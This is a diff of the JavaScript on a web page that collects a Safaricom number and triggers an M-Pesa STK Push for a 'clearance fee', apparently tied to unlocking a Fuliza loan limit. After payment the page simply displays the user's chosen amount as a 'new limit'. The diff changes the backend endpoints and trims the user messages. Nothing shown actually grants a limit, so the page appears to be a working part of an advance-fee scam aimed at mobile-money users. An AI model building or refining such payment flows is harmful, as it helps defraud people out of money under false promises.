@@ -256,6 +256,7 @@ phoneInput.addEventListener("input", () => {
 });
 
 function validatePhoneUI(val) {
+
   if (val.length === 0) {
     phoneWrap.className = "phone-wrap";
     phoneStatus.innerText = "";
@@ -263,26 +264,30 @@ function validatePhoneUI(val) {
     phoneHint.innerText = "Enter 9 digits after 254 — starts with 7 (07xx) or 1 (01xx)";
     return false;
   }
+
   if (val.length < 9) {
     phoneWrap.className = "phone-wrap";
     phoneStatus.innerText = "";
     phoneHint.style.color = "#888";
-    phoneHint.innerText = `${9 - val.length} more digit${9 - val.length !== 1 ? "s" : ""} needed`;
+    phoneHint.innerText = `${9 - val.length} more digits needed`;
     return false;
   }
+
   if (!val.startsWith("7") && !val.startsWith("1")) {
     phoneWrap.className = "phone-wrap invalid";
     phoneStatus.innerText = "✗";
     phoneStatus.style.color = "#e74c3c";
     phoneHint.style.color = "#e74c3c";
-    phoneHint.innerText = "Must start with 7 or 1 — Safaricom numbers only (07xx / 01xx)";
+    phoneHint.innerText = "Must start with 7 or 1 (Safaricom numbers)";
     return false;
   }
+
   phoneWrap.className = "phone-wrap valid";
   phoneStatus.innerText = "✓";
   phoneStatus.style.color = "#1fb141";
   phoneHint.style.color = "#1fb141";
   phoneHint.innerText = "Valid Safaricom number ✓";
+
   return true;
 }
 
@@ -292,115 +297,150 @@ function showStatus(msg, type) {
   el.className = "status-msg " + type;
   el.style.display = "block";
 }
-function hideStatus() { document.getElementById("statusMsg").style.display = "none"; }
+
+function hideStatus() {
+  document.getElementById("statusMsg").style.display = "none";
+}
+
 function setSpinner(show, text) {
   document.getElementById("spinner").style.display = show ? "flex" : "none";
   if (text) document.getElementById("spinnerText").innerText = text;
 }
-function setPayBtn(disabled) { document.getElementById("payBtn").disabled = disabled; }
+
+function setPayBtn(disabled) {
+  document.getElementById("payBtn").disabled = disabled;
+}
 
 let pollInterval = null;
-let currentPhone = null;
-let confettiAnimId = null;
 
 async function payNow() {
+
   const digits = phoneInput.value.trim();
+
   if (!validatePhoneUI(digits)) {
-    showStatus("Please enter a valid Safaricom number (starts with 7 or 1, 9 digits after 254).", "error");
+    showStatus("Please enter a valid Safaricom number.", "error");
     return;
   }
 
   const fullPhone = "254" + digits;
-  currentPhone = fullPhone;
+
   hideStatus();
   setSpinner(true, "Sending STK Push to your phone…");
   setPayBtn(true);
 
   let data;
+
   try {
-    const res = await fetch(BACKEND + "/api/stk-push", {
+
+    const res = await fetch(BACKEND + "/deposit", {
       method: "POST",
-      headers: { "Content-Type": "application/json" },
+      headers: {
+        "Content-Type": "application/json"
+      },
       body: JSON.stringify({
-        amount: CLEARANCE_FEE,
         phone_number: fullPhone,
-        user_reference: "Fuliza Hustle Funds Clearance",
-        payment_id: "wallet",
-      }),
+        amount: CLEARANCE_FEE
+      })
     });
+
     data = await res.json();
+
   } catch (err) {
+
     setSpinner(false);
     setPayBtn(false);
-    showStatus("Network error: Could not reach server. Check your connection and try again.", "error");
+    showStatus("Network error. Could not reach payment server.", "error");
+
     return;
   }
 
   if (!data.success) {
+
     setSpinner(false);
     setPayBtn(false);
-    showStatus(data.message || data.error || "Payment initiation failed. Please try again.", "error");
+    showStatus(data.message || "Payment request failed.", "error");
+
     return;
   }
 
-  const checkoutId = data.checkoutRequestId;
-  setSpinner(true, "STK Push sent ✅ Enter your M-Pesa PIN on your phone…");
-  showStatus("Check your phone and enter your M-Pesa PIN to complete payment.", "info");
+  const reference = data.reference;
 
-  if (!checkoutId) {
-    setSpinner(false);
-    setPayBtn(false);
-    showStatus("Payment sent but could not track status. Check your M-Pesa messages.", "info");
-    return;
-  }
+  setSpinner(true, "STK Push sent ✓ Enter your M-Pesa PIN on your phone");
+  showStatus("Check your phone and enter your M-Pesa PIN.", "info");
 
-  startPolling(checkoutId, fullPhone);
+  startPolling(reference, fullPhone);
 }
 
-function startPolling(checkoutId, phone) {
+function startPolling(reference, phone) {
+
   let attempts = 0;
   const maxAttempts = 40;
 
   clearInterval(pollInterval);
+
   pollInterval = setInterval(async () => {
+
     attempts++;
-    if (attempts === 10) {
+
+    if (attempts === 6) {
       setSpinner(true, "Still waiting for confirmation…");
     }
+
     if (attempts > maxAttempts) {
+
       clearInterval(pollInterval);
-      pollInterval = null;
+
       setSpinner(false);
       setPayBtn(false);
-      hideStatus();
-      showFailurePopup("Payment timed out — no confirmation received. Please try again.");
+
+      showFailurePopup("Payment timed out. Please try again.");
+
       return;
     }
+
     try {
-      const res = await fetch(`${BACKEND}/receipt/${encodeURIComponent(checkoutId)}`);
+
+      const res = await fetch(`${BACKEND}/status/${encodeURIComponent(reference)}`);
+
       const data = await res.json();
+
       if (data.status === "pending" || data.status === "not_found") return;
+
       clearInterval(pollInterval);
-      pollInterval = null;
+
       setSpinner(false);
       setPayBtn(false);
-      hideStatus();
+
       if (data.status === "success" && data.receipt) {
+
         showSuccessPopup(data.receipt, phone);
+
       } else if (data.status === "failed") {
-        showFailurePopup(data.reason || "Payment was not completed. Please try again.");
+
+        showFailurePopup(data.reason || "Payment was not completed.");
+
       }
-    } catch (_) {}
+
+    } catch (err) {}
+
   }, 1200);
 }
 
 function showSuccessPopup(receipt, fallbackPhone) {
-  document.getElementById("rReceiptNo").innerText = receipt.receiptNumber || "N/A";
-  document.getElementById("rAmount").innerText    = "KSh " + (receipt.amount || CLEARANCE_FEE);
-  document.getElementById("rPhone").innerText     = receipt.phone || fallbackPhone || "—";
-  document.getElementById("rDate").innerText      = receipt.transactionDate || new Date().toLocaleString("en-KE");
-  document.getElementById("rNewLimit").innerText  = selectedAmount;
-  localStorage.setItem("currentLimit", selectedAmount);
+
+  document.getElementById("rReceiptNo").innerText =
+    receipt.receiptNumber || "N/A";
+
+  document.getElementById("rAmount").innerText =
+    "KSh " + (receipt.amount || CLEARANCE_FEE);
+
+  document.getElementById("rPhone").innerText =
+    receipt.phone || fallbackPhone;
+
+  document.getElementById("rDate").innerText =
+    receipt.transactionDate || new Date().toLocaleString("en-KE");
+
+  document.getElementById("rNewLimit").innerText = selectedAmount;
 
   document.getElementById("successOverlay").classList.add("show");
 
@@ -414,143 +454,22 @@ function closeSuccess() {
 }
 
 function showFailurePopup(reason) {
-  document.getElementById("failureReason").innerText = reason || "Payment failed. Please try again.";
+
+  document.getElementById("failureReason").innerText =
+    reason || "Payment failed.";
+
   document.getElementById("failureOverlay").classList.add("show");
 }
 
 function retryPayment() {
+
   document.getElementById("failureOverlay").classList.remove("show");
+
   clearInterval(pollInterval);
-  pollInterval = null;
+
   hideStatus();
-  setPayBtn(false);
   setSpinner(false);
-  const digits = phoneInput.value.trim();
-  if (validatePhoneUI(digits)) {
-    payNow();
-  }
-}
-
-/* ── Confetti ── */
-const canvas = document.getElementById("confettiCanvas");
-const ctx = canvas.getContext("2d");
-let confettiPieces = [];
-const COLORS = ["#1fb141","#16903a","#f59e0b","#10b981","#ef4444","#3b82f6","#ec4899","#fbbf24","#34d399","#f472b6"];
-
-function resizeCanvas() {
-  canvas.width  = window.innerWidth;
-  canvas.height = window.innerHeight;
-}
-window.addEventListener("resize", resizeCanvas);
-resizeCanvas();
-
-function randomBetween(a, b) { return a + Math.random() * (b - a); }
-
-function createPiece() {
-  return {
-    x: randomBetween(0, canvas.width),
-    y: randomBetween(-20, -5),
-    w: randomBetween(8, 14),
-    h: randomBetween(4, 8),
-    color: COLORS[Math.floor(Math.random() * COLORS.length)],
-    vx: randomBetween(-2, 2),
-    vy: randomBetween(3, 7),
-    angle: randomBetween(0, Math.PI * 2),
-    spin: randomBetween(-0.15, 0.15),
-    opacity: 1,
-  };
-}
-
-function launchConfetti() {
-  canvas.style.display = "block";
-  confettiPieces = [];
-  for (let i = 0; i < 180; i++) {
-    const p = createPiece();
-    p.y = randomBetween(-200, 0);
-    confettiPieces.push(p);
-  }
-  animateConfetti();
-}
-
-function animateConfetti() {
-  ctx.clearRect(0, 0, canvas.width, canvas.height);
-
-  confettiPieces.forEach((p) => {
-    p.x += p.vx;
-    p.y += p.vy;
-    p.angle += p.spin;
-    if (p.y > canvas.height * 0.7) {
-      p.opacity -= 0.015;
-    }
-
-    ctx.save();
-    ctx.globalAlpha = Math.max(0, p.opacity);
-    ctx.translate(p.x, p.y);
-    ctx.rotate(p.angle);
-    ctx.fillStyle = p.color;
-    ctx.fillRect(-p.w / 2, -p.h / 2, p.w, p.h);
-    ctx.restore();
-  });
-
-  confettiPieces = confettiPieces.filter(p => p.opacity > 0 && p.y < canvas.height + 20);
-
-  if (confettiPieces.length > 0) {
-    confettiAnimId = requestAnimationFrame(animateConfetti);
-  } else {
-    canvas.style.display = "none";
-  }
-}
-
-function stopConfetti() {
-  if (confettiAnimId) cancelAnimationFrame(confettiAnimId);
-  confettiPieces = [];
-  canvas.style.display = "none";
-}
-
-/* ── Celebration Sound ── */
-function playCelebrationSound() {
-  try {
-    const AudioCtx = window.AudioContext || window.webkitAudioContext;
-    if (!AudioCtx) return;
-    const ac = new AudioCtx();
-
-    const notes = [523.25, 659.25, 783.99, 1046.50, 1318.51];
-    const durations = [0.12, 0.12, 0.12, 0.18, 0.30];
-    let t = ac.currentTime + 0.05;
-
-    notes.forEach((freq, i) => {
-      const osc = ac.createOscillator();
-      const gain = ac.createGain();
-      osc.connect(gain);
-      gain.connect(ac.destination);
-      osc.type = "sine";
-      osc.frequency.setValueAtTime(freq, t);
-      gain.gain.setValueAtTime(0.22, t);
-      gain.gain.exponentialRampToValueAtTime(0.001, t + durations[i]);
-      osc.start(t);
-      osc.stop(t + durations[i] + 0.05);
-      t += durations[i] * 0.9;
-    });
-
-    setTimeout(() => {
-      const notes2 = [523.25, 659.25, 783.99, 1046.50, 783.99, 1046.50, 1318.51];
-      let t2 = ac.currentTime + 0.05;
-      notes2.forEach((freq) => {
-        const osc2 = ac.createOscillator();
-        const g2 = ac.createGain();
-        osc2.connect(g2);
-        g2.connect(ac.destination);
-        osc2.type = "triangle";
-        osc2.frequency.setValueAtTime(freq, t2);
-        g2.gain.setValueAtTime(0.15, t2);
-        g2.gain.exponentialRampToValueAtTime(0.001, t2 + 0.2);
-        osc2.start(t2);
-        osc2.stop(t2 + 0.25);
-        t2 += 0.13;
-      });
-    }, 600);
-
-  } catch (e) {}
+  setPayBtn(false);
 }
 </script>
 </body>
